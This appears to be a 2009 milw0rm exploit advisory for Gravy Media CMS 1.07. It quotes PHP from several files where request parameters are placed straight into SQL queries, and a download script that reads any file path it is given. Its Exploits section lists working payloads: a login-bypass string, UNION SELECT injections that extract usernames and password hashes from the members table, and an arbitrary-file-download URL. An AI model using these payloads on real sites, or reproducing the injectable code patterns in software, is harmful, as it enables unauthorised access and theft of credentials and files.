<html><head><title>Gravy Media CMS 1.07 Multiple Remote Vulnerabilities</title></head><pre>#########################################################################################
[0x01] Informations:
Name           : Gravy Media Cms 1.07
Download       : http://www.gravy-media.com/downloads.php
Vulnerability  : Multiple Sql Injections &amp; Arbitrary File Download
Author         : x0r
Contact        : andry2000@hotmail.it
Notes          : Proud To Be Italian
Greetz         : //
#########################################################################################
[0x02] Bug:
Bugged file is /[path]/login.php [..] viewmsg.php [..] rate.php [..]forcedownload.php

[code]
//IF SUBMIT PRESSED FOR LOGIN 
if(isset($_POST['submit'])) {

$get_app = mysql_query(&quot;SELECT * FROM `members` WHERE username = '&quot;.$_POST['username'].&quot;' AND 
user_password = '&quot;.md5($_POST['password']).&quot;'&quot;);
[/code]

[code]
 //you've to be logged
        //We need to grab the msg_id variable from the URL.
        $msg_id = $_REQUEST['msg_id'];
        
        //Get all of the information about the message with and id number of the one sent through the URL
        $view_msg = mysql_query(&quot;SELECT * FROM messages WHERE id = '$msg_id'&quot;);
        $msg = mysql_fetch_array($view_msg);
		
[/code]

[code]

include &quot;connect.php&quot;;
$action = $_GET[&quot;action&quot;];
if (!$action)
  $action = $_POST[&quot;action&quot;];

//print&quot;action = $action&quot;;

if ($action == &quot;rate&quot;){
$filename = $_GET[&quot;file&quot;];
$getcount = mysql_query(&quot;SELECT * FROM files WHERE image='$filename'&quot;); 
 [/code]
 
 [code]
 
 
$filename = $_GET['file'];

//Huge thank you to eLouai for this simple but powerful add-on

// required for IE, otherwise Content-disposition is ignored
if(ini_get('zlib.output_compression'))
  ini_set('zlib.output_compression', 'Off');

// addition by Jorg Weske
$file_extension = strtolower(substr(strrchr($filename,&quot;.&quot;),1));

if( $filename == &quot;&quot; ) 
{
  echo &quot;&lt;html&gt;&lt;title&gt;eLouai's Download Script&lt;/title&gt;&lt;body&gt;ERROR: download file NOT SPECIFIED. USE force-download.php?file=filepath&lt;/body&gt;&lt;/html&gt;&quot;;
  exit;
} elseif ( ! file_exists( $filename ) ) 
{
  echo &quot;&lt;html&gt;&lt;title&gt;eLouai's Download Script&lt;/title&gt;&lt;body&gt;ERROR: File not found. USE force-download.php?file=filepath&lt;/body&gt;&lt;/html&gt;&quot;;
  exit;
};
switch( $file_extension )
{
  case &quot;pdf&quot;: $ctype=&quot;application/pdf&quot;; break;
  case &quot;exe&quot;: $ctype=&quot;application/octet-stream&quot;; break;
  case &quot;zip&quot;: $ctype=&quot;application/zip&quot;; break;
  case &quot;doc&quot;: $ctype=&quot;application/msword&quot;; break;
  case &quot;xls&quot;: $ctype=&quot;application/vnd.ms-excel&quot;; break;
  case &quot;ppt&quot;: $ctype=&quot;application/vnd.ms-powerpoint&quot;; break;
  case &quot;gif&quot;: $ctype=&quot;image/gif&quot;; break;
  case &quot;png&quot;: $ctype=&quot;image/png&quot;; break;
  case &quot;jpeg&quot;:
  case &quot;jpg&quot;: $ctype=&quot;image/jpg&quot;; break;
  default: $ctype=&quot;application/force-download&quot;;
}
header(&quot;Pragma: public&quot;); // required
header(&quot;Expires: 0&quot;);
header(&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;);
header(&quot;Cache-Control: private&quot;,false); // required for certain browsers 
header(&quot;Content-Type: $ctype&quot;);
// change, added quotes to allow spaces in filenames, by Rajkumar Singh
header(&quot;Content-Disposition: attachment; filename=\&quot;&quot;.basename($filename).&quot;\&quot;;&quot; );
header(&quot;Content-Transfer-Encoding: binary&quot;);
header(&quot;Content-Length: &quot;.filesize($filename));
readfile(&quot;$filename&quot;);
exit();

[/code]
 
#########################################################################################
[0x03] Exploits:
1- admin' or ' 1=1--
2- [LoginRequired] http://site.it/viewmsg.php?msg_id=' union select 0,0,0,concat(username,char(54),user_password),0,0 from members--
3- http://site.it/rate.php?action=rate&amp;file=' union select 0,0,0,concat(username,user_password),0,0 from members--
4- http://site.it/forcedownload.php?file=[file]
########################################################################################

# milw0rm.com [2009-03-30]</pre></html>